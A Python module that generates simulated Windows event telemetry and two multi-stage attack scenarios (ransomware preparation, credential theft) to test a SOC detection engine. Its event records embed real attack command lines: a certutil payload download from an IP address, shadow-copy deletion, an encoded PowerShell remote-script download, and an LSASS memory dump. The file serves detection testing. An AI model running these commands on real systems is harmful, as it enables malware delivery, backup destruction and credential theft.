"""
AEGIS-SOC Attack & Telemetry Simulator
Generates high-fidelity Windows event streams and multi-stage APT attack campaigns.
"""
from typing import Dict, Any, List
import random
import time
from datetime import datetime
from backend.normalizer import normalize_event
from backend.database import insert_event
from backend.detection_engine import engine as detection_engine

class AttackSimulator:
    def __init__(self):
        self.hosts = ["DESKTOP-WIN11-SEC", "SRV-DC01", "WKSTN-FINANCE03", "APP-PROD-WIN10"]
        self.users = ["SYSTEM", "jdoe.admin", "analyst_sarah", "svc_sql", "finance_user"]

    def generate_normal_event(self) -> Dict[str, Any]:
        """
        Generates normal background Windows workstation telemetry.
        """
        event_types = [
            # 4624 Logon
            {
                "channel": "Security",
                "event_id": 4624,
                "computer": random.choice(self.hosts),
                "user": random.choice(self.users),
                "process_name": "C:\\Windows\\System32\\lsass.exe",
                "command_line": "",
                "severity": "INFO"
            },
            # Sysmon 1 Normal App Launch
            {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "computer": random.choice(self.hosts),
                "user": random.choice(self.users),
                "process_name": random.choice([
                    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                    "C:\\Windows\\explorer.exe",
                    "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                    "C:\\Windows\\System32\\svchost.exe"
                ]),
                "command_line": "chrome.exe --enable-features=NetworkService",
                "severity": "INFO"
            },
            # Sysmon 3 Normal DNS / HTTPS
            {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "computer": random.choice(self.hosts),
                "user": "SYSTEM",
                "process_name": "C:\\Windows\\System32\\svchost.exe",
                "dest_ip": random.choice(["142.250.190.46", "20.112.52.29", "1.1.1.1"]),
                "dest_port": 443,
                "severity": "INFO"
            }
        ]
        raw = random.choice(event_types)
        raw["timestamp"] = datetime.utcnow().isoformat() + "Z"
        normalized = normalize_event(raw)
        db_id = insert_event(normalized)
        normalized["id"] = db_id
        return normalized

    def run_apt_scenario_ransomware(self, target_host: str = "DESKTOP-WIN11-SEC") -> List[Dict[str, Any]]:
        """
        Multi-Stage Attack: Ransomware Pre-Encryption & Shadow Copy Annihilation
        """
        stages = [
            # Stage 1: LOLBAS Certutil Download
            {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "computer": target_host,
                "user": "jdoe.admin",
                "process_name": "C:\\Windows\\System32\\certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://194.26.29.112/payload.bin C:\\Users\\Public\\update.exe",
                "dest_ip": "194.26.29.112",
                "dest_port": 80
            },
            # Stage 2: Suspicious Process Spawning from Public
            {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "computer": target_host,
                "user": "jdoe.admin",
                "process_name": "C:\\Users\\Public\\update.exe",
                "parent_process": "C:\\Windows\\System32\\certutil.exe",
                "command_line": "C:\\Users\\Public\\update.exe --stage2",
            },
            # Stage 3: Defense Evasion & Shadow Copy Deletion (CRITICAL)
            {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "computer": target_host,
                "user": "SYSTEM",
                "process_name": "C:\\Windows\\System32\\vssadmin.exe",
                "parent_process": "C:\\Users\\Public\\update.exe",
                "command_line": "vssadmin.exe delete shadows /all /quiet",
            },
            # Stage 4: Registry Run Key Persistence
            {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 13,
                "computer": target_host,
                "user": "SYSTEM",
                "process_name": "C:\\Users\\Public\\update.exe",
                "raw_data": {
                    "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityUpdate"
                }
            }
        ]
        
        results = []
        for step in stages:
            step["timestamp"] = datetime.utcnow().isoformat() + "Z"
            norm = normalize_event(step)
            db_id = insert_event(norm)
            norm["id"] = db_id
            # Evaluate detection
            alert = detection_engine.evaluate(norm, db_id)
            if alert:
                norm["alert"] = alert
            results.append(norm)
        return results

    def run_apt_scenario_credential_theft(self, target_host: str = "SRV-DC01") -> List[Dict[str, Any]]:
        """
        Multi-Stage Attack: Memory Injection & LSASS Credential Harvesting
        """
        stages = [
            # Stage 1: Obfuscated PowerShell Execution
            {
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "event_id": 4104,
                "computer": target_host,
                "user": "svc_sql",
                "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AbQAuAHAAcwAxACcAKQA=",
            },
            # Stage 2: Direct LSASS Memory Access (Mimikatz / ProcDump)
            {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 10,
                "computer": target_host,
                "user": "SYSTEM",
                "process_name": "C:\\Windows\\System32\\lsass.exe",
                "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full",
            },
            # Stage 3: Outbound C2 Beacon to Cobalt Strike Port
            {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "computer": target_host,
                "user": "SYSTEM",
                "process_name": "C:\\Windows\\System32\\rundll32.exe",
                "dest_ip": "185.192.69.45",
                "dest_port": 4444,
            }
        ]

        results = []
        for step in stages:
            step["timestamp"] = datetime.utcnow().isoformat() + "Z"
            norm = normalize_event(step)
            db_id = insert_event(norm)
            norm["id"] = db_id
            alert = detection_engine.evaluate(norm, db_id)
            if alert:
                norm["alert"] = alert
            results.append(norm)
        return results

simulator = AttackSimulator()
